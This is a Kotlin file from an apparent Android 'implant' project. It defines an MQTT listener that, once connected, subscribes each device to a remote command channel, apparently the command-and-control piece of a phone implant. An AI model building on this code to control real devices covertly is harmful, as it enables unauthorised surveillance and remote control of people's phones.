package com.cooperthecoder.implant.command

import android.content.Context
import android.util.Log
import com.cooperthecoder.implant.data.DeviceProperties
import org.eclipse.paho.client.mqttv3.IMqttActionListener
import org.eclipse.paho.client.mqttv3.IMqttAsyncClient
import org.eclipse.paho.client.mqttv3.IMqttToken


class CommandConnectionListener(context: Context, val channel: String) : IMqttActionListener {

    val context: Context = context.applicationContext

    companion object {
        const val DEFAULT_QOS = 0
        val TAG: String = CommandConnectionListener::class.java.name
    }

    override fun onSuccess(token: IMqttToken) {
        subscribeToCommandChannels(token.client)
    }

    override fun onFailure(token: IMqttToken, exception: Throwable) {
        Log.d(TAG, "Failed to connect to ${token.client.serverURI}")
        exception.printStackTrace()
    }

    fun subscribeToCommandChannels(client: IMqttAsyncClient) {
        val commandChannelName = DeviceProperties.commandChannelName(context)
        Log.d(TAG, "Connection successful! Subscribing to $commandChannelName")
        client.subscribe(commandChannelName, DEFAULT_QOS, null, CommandSubscriptionCallback())
    }
}

